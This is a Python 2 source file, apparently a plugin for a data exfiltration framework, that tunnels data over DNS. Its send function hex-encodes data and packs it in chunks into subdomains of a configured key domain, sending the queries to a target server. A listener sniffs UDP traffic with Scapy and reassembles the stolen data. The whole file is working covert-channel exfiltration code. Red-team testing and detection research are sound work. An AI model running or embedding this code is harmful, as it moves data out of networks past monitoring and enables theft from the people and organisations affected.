from dnslib import *
try:
    from scapy.all import *
except:
    print "You should install Scapy if you run the server.."

app_exfiltrate = None
config = None
buf = {}


def handle_dns_packet(x):
    global buf
    try:
        qname = x.payload.payload.payload.qd.qname
        if (config['key'] in qname):
            app_exfiltrate.log_message(
                'info', '[dns] DNS Query: {0}'.format(qname))
            data = qname.split(".")[0]
            jobid = data[0:7]
            data = data.replace(jobid, '')
            # app_exfiltrate.log_message('info', '[dns] jobid = {0}'.format(jobid))
            # app_exfiltrate.log_message('info', '[dns] data = {0}'.format(data))
            if jobid not in buf:
                buf[jobid] = []
            if data not in buf[jobid]:
                buf[jobid].append(data)
            if (len(qname) < 68):
                app_exfiltrate.retrieve_data(''.join(buf[jobid]).decode('hex'))
                buf[jobid] = []
    except Exception, e:
        # print e
        pass


def send(data):
    target = config['target']
    port = config['port']
    jobid = data.split("|!|")[0]
    data = data.encode('hex')
    while data != "":
        tmp = data[:66 - len(config['key']) - len(jobid)]
        data = data.replace(tmp, '')
        domain = "{0}{1}.{2}".format(jobid, tmp, config['key'])
        app_exfiltrate.log_message(
            'info', "[dns] Sending {0} to {1}".format(domain, target))
        q = DNSRecord.question(domain)
        try:
            q.send(target, port, timeout=0.01)
        except:
            # app_exfiltrate.log_message('warning', "[dns] Failed to send DNS request")
            pass


def listen():
    app_exfiltrate.log_message(
        'info', "[dns] Waiting for DNS packets for domain {0}".format(config['key']))
    sniff(filter="udp and port {}".format(
        config['port']), prn=handle_dns_packet)


class Plugin:

    def __init__(self, app, conf):
        global app_exfiltrate, config
        config = conf
        app.register_plugin('dns', {'send': send, 'listen': listen})
        app_exfiltrate = app
